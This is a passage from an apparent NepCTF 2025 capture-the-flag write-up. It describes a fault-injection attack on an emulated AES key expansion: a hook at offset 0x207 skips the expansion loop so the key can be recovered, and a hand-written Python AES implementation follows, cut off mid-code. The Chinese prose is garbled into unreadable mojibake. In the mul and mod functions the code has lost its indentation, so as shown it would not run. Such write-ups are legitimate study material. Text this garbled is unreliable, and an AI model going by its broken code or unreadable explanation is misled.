å¯†æ˜æ–‡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡ä¿®æ”¹å¯†é’¥æ‰©å±•ç®—æ³•ï¼Œå†ç»“åˆæ˜æ–‡å’Œå¯†é’¥çš„å…³ç³»æ¥è·å–å¯†é’¥ã€‚é€šè¿‡åˆ†ææˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹<code>i</code>çš„å¤§å°ï¼Œè®©<code>i</code>ç›´æ¥è·³è¿‡do-whileï¼Œè¿™æ ·æ‰©å±•å¯†é’¥å°±ä¼šå˜æˆé™¤äº†ç¬¬ä¸€ç»„æ˜¯åŸå§‹å¯†é’¥<code>key</code>ï¼Œå…¶ä»–10ç»„éƒ½é»˜è®¤ä¸º0ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½ç”¨æ¥ç”Ÿæˆæ‰©å±•å¯†é’¥ä¸ºå…¨<code>0</code>è¿›è¡Œè§£å¯†ï¼Œæœ€åå†å¼‚æˆ–ä¸€ä¸‹æ˜æ–‡<code>m</code>å°±èƒ½å¾—åˆ°<code>key</code>ã€‚<br>é¦–å…ˆæˆ‘ä»¬è¦æ‰¾åˆ°å¯¹åº”çš„æ³¨å…¥ç‚¹ï¼Œé€šè¿‡æŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ‰¾åˆ°æ‰©å±•å¯†é’¥åˆå§‹åŒ–æ—¶<code>++i</code>çš„æŒ‡ä»¤<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807235637972.png"><br>æ‰¾åˆ°ç›¸å¯¹åœ°å€ä¸º<code>0x207</code>ï¼Œç„¶ååœ¨<code>hook_code</code>ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç æ¥è·å–å¯¹åº”çš„æ•…éšœæ³¨å…¥ç‚¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(address == CODE_ADDRESS + <span class="hljs-number">0x207</span>):<br>    <span class="hljs-built_in">print</span>(CODE_COUNT)<br></code></pre></td></tr></table></figure><p>è¿è¡Œé¢˜ç›®æ‰€ç»™è„šæœ¬ï¼Œå–æœ€åä¸€ä¸ª<code>CODE_COUNT</code>ä½œä¸º<code>Shocktime</code><br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807235830838.png"><br>å¾—åˆ°<code>Shocktime</code>ä¸º90ï¼Œä¹‹åä¾¿å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ï¼Œé¦–å…ˆæˆ‘ä»¬è¦æœ‰ä¸€ä¸ªèƒ½å¤Ÿè‡ªå®šä¹‰è½®å¯†é’¥çš„AESè§£å¯†è„šæœ¬ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€ä¸ªï¼š<a href="https://wuuconix.link/2021/10/08/aes/">AES åŠ è§£å¯† pythonæ‰‹åŠ¨å®ç° - wuuconixâ€™s blog</a><br>ç¨å¾®å¯¹è„šæœ¬è¿›è¡Œä¿®æ”¹ï¼Œå†™ä¸€ä¸ªç”Ÿæˆå…¨0çš„è½®å¯†é’¥ç”Ÿæˆå‡½æ•°ï¼Œå¹¶å°†è§£å¯†çš„è¾“å‡ºç»“æœè°ƒæ•´ä¸€ä¸‹å³å¯ã€‚</p><h3 id="è§£ç­”-3"><a href="#è§£ç­”-3" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p><code>aes.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">poly1, poly2</span>):   <span class="hljs-comment"># ä¸¤ä¸ªå¤šé¡¹å¼ç›¸ä¹˜</span><br>result = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(poly2.bit_length()):<br><span class="hljs-keyword">if</span> poly2 &amp; (<span class="hljs-number">1</span> &lt;&lt; index):<br>result ^= (poly1 &lt;&lt; index)<br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod</span>(<span class="hljs-params">poly, mod = <span class="hljs-number">0b100011011</span></span>):    <span class="hljs-comment"># å¤šé¡¹å¼polyæ¨¡å¤šé¡¹å¼100011011</span><br><span class="hljs-keyword">while</span> poly.bit_length() &gt; <span class="hljs-number">8</span>:  <br>poly ^= (mod &lt;&lt; (poly.bit_length() - <span class="hljs-number">9</span>))<br><span class="hljs-keyword">return</span> poly<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">m_hex, inverse=<span class="hljs-literal">False</span></span>):<br>    m_s = []<br>    box = s_box <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_s_box<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m_hex:<br>        x, y = <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) // <span class="hljs-number">16</span>, <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) % <span class="hljs-number">16</span><br>        temp = <span class="hljs-built_in">hex</span>(box[x*<span class="hljs-number">16</span>+y])<br>        m_s.append(temp)<br>    <span class="hljs-keyword">return</span> m_s<br><br>s_box =   [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]<br>i_s_box = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>]<br>rcon = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x36</span>]<br>mix_column_matrix   = [<span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>] <span class="hljs-comment"># åˆ—æ··åˆä¹˜çš„çŸ©é˜µ</span><br>i_mix_column_matrix = [<span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>] <span class="hljs-comment"># åˆ—æ··åˆä¹˜çš„é€†çŸ©é˜µ</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, key</span>): <span class="hljs-comment">#aå’Œkeyéƒ½æ˜¯åˆ—è¡¨ï¼Œéƒ½å­˜äº†16å­—èŠ‚</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[i], <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(key[i], <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hex</span>(<span class="hljs-params">s</span>): <span class="hljs-comment">#å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶å€¼ï¼Œä»¥åˆ—è¡¨å½¢å¼è¿”å›</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shiftrows</span>(<span class="hljs-params">a, inverse=<span class="hljs-literal">False</span></span>): <span class="hljs-comment">#inverseä¸ºTrueæ—¶è¡¨ç¤ºä¸ºé€†æ“ä½œï¼Œé»˜è®¤ä¸ºFalse</span><br>    <span class="hljs-keyword">return</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">3</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">11</span>] ] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">11</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">3</span>] ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mixcolumn</span>(<span class="hljs-params">m_row, inverse=<span class="hljs-literal">False</span></span>):<br>    matrix = mix_column_matrix <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_mix_column_matrix<br>    m_col = []<br>    <span 